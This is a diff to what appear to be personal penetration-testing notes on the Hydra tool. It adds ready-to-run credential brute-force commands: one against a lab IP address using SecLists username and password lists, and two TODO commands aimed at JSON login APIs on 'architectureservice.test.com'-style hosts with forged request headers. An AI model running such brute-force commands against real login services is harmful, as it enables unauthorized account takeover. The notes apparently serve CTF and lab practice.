@@ -109,6 +109,11 @@ In case of JSON Post Authentication, we need to specify the Content-Type: applic
 application/json
 hydra -l admin@juice-sh.op -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt 10.10.174.18 http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid"
 
+# Common Credentials
+```console
+hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt 10.129.95.192 -s 80 http-post-form "/:username=^USER^&password=^PASS^:Wrong Credentials" -f 
+```
+N.B. Hydra will ignore js tags, taking only strings (es <script>alert("Wrong Credentials")</script>)
 
 ## Flags
 
@@ -134,3 +139,9 @@ Hydra needs just the setup of the following environment variable
 ```console
 export HYDRA_PROXY_HTTP=http://127.0.0.1:8080
 ```
+
+[TODO]
+hydra -v -V -L "users.txt" -P "passwords.txt" -s 80 architectureservice.test.com http-post-form "/api/v1/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:changeFirstName:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http\://architectureclient.test.com/:H=Origin: http\://architectureclient.test.com:H=Connection: keep-alive"
+
+
+hydra -v -V -L "users.txt" -P "passwords.txt" -s 80 architectureservice.tester.com http-post-form "/api/v1/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=firstName:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http\://architectureclient.tester.com/:H=Origin: http\://architectureclient.tester.com:H=Connection: keep-alive"
